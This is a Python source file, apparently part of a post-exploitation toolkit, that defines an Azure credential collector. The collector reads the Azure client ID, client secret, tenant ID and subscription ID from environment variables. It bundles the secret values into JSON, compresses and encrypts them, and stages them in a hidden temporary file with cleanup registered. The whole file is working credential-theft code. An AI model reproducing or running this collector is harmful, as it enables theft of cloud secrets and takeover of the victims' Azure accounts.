from __future__ import annotations

import logging
import os
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)


class AzureCollector(BaseCollector):
    """
    Collect Azure credentials from environment variables.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        """Discover Azure credentials in environment variables."""
        azure_vars = {
            "AZURE_CLIENT_ID",
            "AZURE_CLIENT_SECRET",
            "AZURE_TENANT_ID",
            "AZURE_SUBSCRIPTION_ID",
        }

        found_vars: dict[str, str] = {}
        for var in azure_vars:
            if var in os.environ:
                found_vars[var] = os.environ[var]

        if found_vars:
            yield ArtifactMetadata(
                artifact_family="azure_credentials",
                artifact_subtype="environment_variables",
                source_path="os.environ",
                source_platform=os.name,
                collection_method="api_call",
                report_safe_summary_fields={"variable_names": sorted(found_vars.keys())},
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        """Collect Azure credentials from environment variables."""
        if artifact.collection_method == "api_call":
            import json

            sensitive = {
                var: os.environ[var]
                for var in (
                    "AZURE_CLIENT_ID",
                    "AZURE_CLIENT_SECRET",
                    "AZURE_TENANT_ID",
                    "AZURE_SUBSCRIPTION_ID",
                )
                if var in os.environ
            }
            if not sensitive:
                return None

            data = json.dumps({"source": "AZURE_ENV", "vars": sensitive}, indent=2).encode()
            sha256 = self._sha256(data)
            payload = self._compress_and_encrypt(data)

            stage_path = self._staging_dir / f".{sha256[:16]}.azure_ctx.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path="AZURE_CONTEXT",
                sha256=sha256,
                size_bytes=len(payload),
                metadata=artifact,
            )
            self.persist_metadata(record)
            return record

        return None
